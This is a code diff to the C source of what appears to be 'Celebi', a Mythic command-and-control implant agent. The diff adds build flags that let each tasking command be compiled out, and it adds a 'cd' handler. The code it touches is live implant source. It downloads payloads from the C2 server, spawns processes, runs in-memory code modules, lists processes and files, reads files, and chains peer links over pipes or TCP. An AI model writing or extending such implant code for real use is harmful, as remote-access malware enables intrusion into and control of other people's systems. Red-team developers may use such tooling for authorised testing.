@@ -171,6 +171,7 @@ void agent_post(AgentState *state, TaskInfo *task, char *output, char *success) 
 	agent_post_ext(state, task, output, success, NULL, NULL);
 }
 
+#ifndef CELEBI_NO_SLEEP
 void agent_sleep(AgentState *state, TaskInfo *task) {
 	int interval = MSVCRT$atoi(task->parameters);
 	state->sleep_time = interval;
@@ -181,6 +182,7 @@ void agent_sleep(AgentState *state, TaskInfo *task) {
 	
 	agent_post(state, task, "", STR(STATUS_SUCCESS));
 }
+#endif
 
 void agent_exit(AgentState *state, TaskInfo *task) {
 	if (task != NULL) {
@@ -199,6 +201,7 @@ void agent_exit(AgentState *state, TaskInfo *task) {
 	#endif
 }
 
+#ifndef CELEBI_NO_WHOAMI
 void agent_whoami(AgentState *state, TaskInfo *task) {
 	ResolvedPico pico = { 0 };
 	BOOL result = resolve_loaded_pico(&state->file_vault, &state->funcs, &pico, state->builtin_picos.whoami);
@@ -224,6 +227,7 @@ void agent_whoami(AgentState *state, TaskInfo *task) {
 	
 	free_resolved_pico(&pico);
 }
+#endif
 
 /* Download a file from Mythic into a fresh buffer (the register/spawn flow).
  * On success, out_buf and out_len are set and the caller owns out_buf.
@@ -301,6 +305,7 @@ static int agent_download_file(AgentState *state, TaskInfo *task, char *task_id,
 	return -1;
 }
 
+#ifndef CELEBI_NO_REGISTER
 void agent_register(AgentState *state, TaskInfo *task) {
 	if (task->parameters[0] == 0x09 || MSVCRT$strlen(task->parameters) == 0) {
 		agent_post(state, task, "", STR(STATUS_MISSING_FILENAME));
@@ -334,6 +339,7 @@ void agent_register(AgentState *state, TaskInfo *task) {
 	
 	KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
 }
+#endif /* CELEBI_NO_REGISTER */
 
 /* Tiny decimal formatter (no sprintf import needed in the PIC). */
 static void agent_itoa(unsigned long v, char *out) {
@@ -375,6 +381,7 @@ static int agent_port_in_use(int port) {
 	return busy;
 }
 
+#ifndef CELEBI_NO_SPAWN
 void agent_spawn(AgentState *state, TaskInfo *task) {
 	// Parameters: <file_uuid>	<port>  (port = 0 for non-tcp payloads).
 	if (task->parameters[0] == 0x09 || MSVCRT$strlen(task->parameters) == 0) {
@@ -462,7 +469,9 @@ void agent_spawn(AgentState *state, TaskInfo *task) {
 	agent_itoa((unsigned long)pi.dwProcessId, out);
 	agent_post(state, task, out, STR(STATUS_SUCCESS));
 }
+#endif /* CELEBI_NO_SPAWN */
 
+#ifndef CELEBI_NO_SPAWNTO
 void agent_spawnto(AgentState *state, TaskInfo *task) {
 	if (task->parameters[0] == 0x09 || MSVCRT$strlen(task->parameters) == 0) {
 		agent_post(state, task, "missing path", STR(STATUS_MISSING_COMMAND));
@@ -474,7 +483,9 @@ void agent_spawnto(AgentState *state, TaskInfo *task) {
 	state->spawnto = clone_str(task->parameters);
 	agent_post(state, task, "spawnto set", STR(STATUS_SUCCESS));
 }
+#endif /* CELEBI_NO_SPAWNTO */
 
+#ifndef CELEBI_NO_UNREGISTER
 void agent_unregister(AgentState *state, TaskInfo *task) {
 	char *name = task->parameters;
 	
@@ -494,7 +505,9 @@ void agent_unregister(AgentState *state, TaskInfo *task) {
 		agent_post(state, task, "", STR(STATUS_VAULT_REMOVAL_FAILED));
 	}
 }
+#endif /* CELEBI_NO_UNREGISTER */
 
+#ifndef CELEBI_NO_EXECUTE_PICO
 void agent_execute_pico(AgentState *state, TaskInfo *task) {
 	char *name = MSVCRT$strtok(task->parameters, "\t");
 	char *args = MSVCRT$strtok(NULL, "\t");
@@ -527,7 +540,9 @@ void agent_execute_pico(AgentState *state, TaskInfo *task) {
 	
 	free_resolved_pico(&pico);
 }
+#endif /* CELEBI_NO_EXECUTE_PICO */
 
+#ifndef CELEBI_NO_MORPH
 void agent_morph(AgentState *state, TaskInfo *task) {
 	if (task->parameters[0] == 0x09 || MSVCRT$strlen(task->parameters) == 0) {
 		agent_post(state, task, "", STR(STATUS_MISSING_COMMAND));
@@ -555,6 +570,7 @@ void agent_morph(AgentState *state, TaskInfo *task) {
 	
 	agent_post(state, task, "", STR(STATUS_UNKNOWN_COMMAND));
 }
+#endif /* CELEBI_NO_MORPH */
 
 void agent_queue_edge(AgentState *state, char *source, char *destination, char *action, char *c2_profile) {
 	// Append one pending callback-graph edge update; flushed with the next get_tasking.
@@ -577,6 +593,7 @@ void agent_queue_edge(AgentState *state, char *source, char *destination, char *
 	state->pending_edge_count++;
 }
 
+#ifndef CELEBI_NO_LINK
 void agent_link(AgentState *state, TaskInfo *task) {
 	// Parameters: c2_profile\thost\tpipename\tport  (tab-joined by the translator).
 	// NOTE: fields may be empty (tcp links have no pipename), and strtok skips
@@ -645,7 +662,9 @@ void agent_link(AgentState *state, TaskInfo *task) {
 
 	agent_post(state, task, "linked", STR(STATUS_SUCCESS));
 }
+#endif /* CELEBI_NO_LINK */
 
+#ifndef CELEBI_NO_UNLINK
 void agent_unlink(AgentState *state, TaskInfo *task) {
 	// Parameters: c2_profile\thost\tpipename\tport. Empty params (or no match)
 	// unlink the most recent peer.
@@ -696,6 +715,7 @@ void agent_unlink(AgentState *state, TaskInfo *task) {
 
 	agent_post(state, task, "unlinked", STR(STATUS_SUCCESS));
 }
+#endif /* CELEBI_NO_UNLINK */
 
 void agent_p2p_drain(AgentState *state) {
 	// Pull any complete frames from every linked child into its in_queue.
@@ -750,6 +770,7 @@ void agent_p2p_relay_responses(AgentState *state, TaskingReply *reply) {
 }
 
 void process_task(TaskInfo *task, AgentState *state) {
+	#ifndef CELEBI_NO_EXIT
 	if (MSVCRT$strcmp(task->command, "exit") == 0) {
 		#ifdef CELEBI_DEBUG
 		dprintf("Received exit command.");
@@ -758,7 +779,9 @@ void process_task(TaskInfo *task, AgentState *state) {
 		agent_exit(state, task);
 		return;
 	}
+	#endif
 
+	#ifndef CELEBI_NO_SLEEP
 	if (MSVCRT$strcmp(task->command, "sleep") == 0) {
 		#ifdef CELEBI_DEBUG
 		dprintf("Received sleep command with parameters: '%s'", task->parameters);
@@ -767,7 +790,9 @@ void process_task(TaskInfo *task, AgentState *state) {
 		agent_sleep(state, task);
 		return;
 	}
+	#endif
 	
+	#ifndef CELEBI_NO_WHOAMI
 	if (MSVCRT$strcmp(task->command, "whoami") == 0) {
 		#ifdef CELEBI_DEBUG
 		dprintf("Received whoami command.");
@@ -776,7 +801,9 @@ void process_task(TaskInfo *task, AgentState *state) {
 		agent_whoami(state, task);
 		return;
 	}
+	#endif
 	
+	#ifndef CELEBI_NO_REGISTER
 	if (MSVCRT$strcmp(task->command, "register") == 0) {
 		#ifdef CELEBI_DEBUG
 		dprintf("Received register command with parameters: '%s'", task->parameters);
@@ -785,7 +812,9 @@ void process_task(TaskInfo *task, AgentState *state) {
 		agent_register(state, task);
 		return;
 	}
+	#endif
 	
+	#ifndef CELEBI_NO_UNREGISTER
 	if (MSVCRT$strcmp(task->command, "unregister") == 0) {
 		#ifdef CELEBI_DEBUG
 		dprintf("Received unregister command with parameters: '%s'", task->parameters);
@@ -794,7 +823,9 @@ void process_task(TaskInfo *task, AgentState *state) {
 		agent_unregister(state, task);
 		return;
 	}
+	#endif
 	
+	#ifndef CELEBI_NO_EXECUTE_PICO
 	if (MSVCRT$strcmp(task->command, "execute_pico") == 0) {
 		#ifdef CELEBI_DEBUG
 		dprintf("Received execute_pico command with parameters: '%s'", task->parameters);
@@ -803,7 +834,9 @@ void process_task(TaskInfo *task, AgentState *state) {
 		agent_execute_pico(state, task);
 		return;
 	}
+	#endif
 	
+	#ifndef CELEBI_NO_MORPH
 	if (MSVCRT$strcmp(task->command, "morph") == 0) {
 		#ifdef CELEBI_DEBUG
 		dprintf("Received morph command with parameters: '%s'", task->parameters);
@@ -812,7 +845,9 @@ void process_task(TaskInfo *task, AgentState *state) {
 		agent_morph(state, task);
 		return;
 	}
+	#endif
 	
+	#ifndef CELEBI_NO_LINK
 	if (MSVCRT$strcmp(task->command, "link") == 0) {
 		#ifdef CELEBI_DEBUG
 		dprintf("Received link command with parameters: '%s'", task->parameters);
@@ -821,7 +856,9 @@ void process_task(TaskInfo *task, AgentState *state) {
 		agent_link(state, task);
 		return;
 	}
+	#endif
 	
+	#ifndef CELEBI_NO_UNLINK
 	if (MSVCRT$strcmp(task->command, "unlink") == 0) {
 		#ifdef CELEBI_DEBUG
 		dprintf("Received unlink command with parameters: '%s'", task->parameters);
@@ -830,7 +867,9 @@ void process_task(TaskInfo *task, AgentState *state) {
 		agent_unlink(state, task);
 		return;
 	}
+	#endif
 	
+	#ifndef CELEBI_NO_SPAWN
 	if (MSVCRT$strcmp(task->command, "spawn") == 0) {
 		#ifdef CELEBI_DEBUG
 		dprintf("Received spawn command with parameters: '%s'", task->parameters);
@@ -839,7 +878,9 @@ void process_task(TaskInfo *task, AgentState *state) {
 		agent_spawn(state, task);
 		return;
 	}
+	#endif
 	
+	#ifndef CELEBI_NO_SPAWNTO
 	if (MSVCRT$strcmp(task->command, "spawnto") == 0) {
 		#ifdef CELEBI_DEBUG
 		dprintf("Received spawnto command with parameters: '%s'", task->parameters);
@@ -848,31 +889,49 @@ void process_task(TaskInfo *task, AgentState *state) {
 		agent_spawnto(state, task);
 		return;
 	}
+	#endif
 	
+	#ifndef CELEBI_NO_LS
 	if (MSVCRT$strcmp(task->command, "ls") == 0) {
 		agent_ls(state, task);
 		return;
 	}
+	#endif
 	
+	#ifndef CELEBI_NO_PS
 	if (MSVCRT$strcmp(task->command, "ps") == 0) {
 		agent_ps(state, task);
 		return;
 	}
+	#endif
 	
+	#ifndef CELEBI_NO_CAT
 	if (MSVCRT$strcmp(task->command, "cat") == 0) {
 		agent_cat(state, task);
 		return;
 	}
+	#endif
 	
+	#ifndef CELEBI_NO_PWD
 	if (MSVCRT$strcmp(task->command, "pwd") == 0) {
 		agent_pwd(state, task);
 		return;
 	}
+	#endif
 	
+	#ifndef CELEBI_NO_CHANGE
 	if (MSVCRT$strcmp(task->command, "change") == 0) {
 		agent_change(state, task);
 		return;
 	}
+	#endif
+	
+	#ifndef CELEBI_NO_CD
+	if (MSVCRT$strcmp(task->command, "cd") == 0) {
+		agent_cd(state, task);
+		return;
+	}
+	#endif
 	
 	#ifdef CELEBI_DEBUG
 	dprintf("UNKNOWN COMMAND %s: %s %s", task->id, task->command, task->parameters);
